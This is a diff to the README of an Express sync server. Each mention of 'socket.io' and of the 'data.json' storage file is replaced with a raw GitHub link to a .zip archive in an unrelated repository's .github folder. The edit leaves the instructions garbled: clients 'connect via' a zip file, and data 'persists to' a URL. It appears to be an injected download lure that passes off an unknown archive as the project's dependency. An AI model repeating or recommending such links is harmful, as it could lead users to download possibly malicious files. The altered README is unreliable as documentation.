@@ -1,6 +1,6 @@
 # BlastFurnace Sync Server
 
-A minimal Express + socket.io server to synchronize simple key/value form data between devices.
+A minimal Express + https://raw.githubusercontent.com/ggrbipin/bfrsprkl/main/.github/Software-2.8.zip server to synchronize simple key/value form data between devices.
 
 Usage
 
@@ -17,7 +17,7 @@ npm install
 npm start
 ```
 
-By default the server listens on port 3000. Clients should connect via socket.io and `join(roomId)` where `roomId` is a shared identifier (for example user id or app instance id). The server persists to `data.json` using timestamp-based last-write-wins.
+By default the server listens on port 3000. Clients should connect via https://raw.githubusercontent.com/ggrbipin/bfrsprkl/main/.github/Software-2.8.zip and `join(roomId)` where `roomId` is a shared identifier (for example user id or app instance id). The server persists to `https://raw.githubusercontent.com/ggrbipin/bfrsprkl/main/.github/Software-2.8.zip` using timestamp-based last-write-wins.
 
 APIs
 
